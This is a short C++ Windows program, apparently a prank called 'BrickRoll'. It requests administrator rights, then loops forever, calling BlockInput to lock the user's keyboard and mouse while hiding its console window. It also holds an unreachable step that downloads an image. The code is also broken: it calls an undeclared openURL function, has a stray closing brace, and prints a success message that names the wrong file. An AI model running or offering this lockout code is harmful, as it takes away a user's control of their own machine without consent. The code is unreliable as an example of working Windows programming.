
#define _WIN32_WINNT 0x0A00

#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <shellapi.h>
#include <winreg.h>
#include <cstdio>


int main(int argc, char** argv)
{

    //Executes the program as admin.
    ShellExecute(NULL, L"runas", L"BrickRoll.exe", NULL, NULL, 0);

    while (TRUE)
    {
        //Blocks the input of the users.
        BlockInput(TRUE);

        //Handles and hides the console window.
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);

        openURL();

    }
    // the URL to download from 
    const wchar_t* srcURL = L"https://i.ytimg.com/vi/8-58S8e2kQ4/maxresdefault.jpg";

    // the destination file 
    const wchar_t* destFile = L"roll.jpg";

    // URLDownloadToFile returns S_OK on success 
    if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
    {

        printf("Saved to 'myfile.txt'");

        return 0;

    }

    else
    {

        printf("Failed");

        return -1;

    }



    return 0;
}
}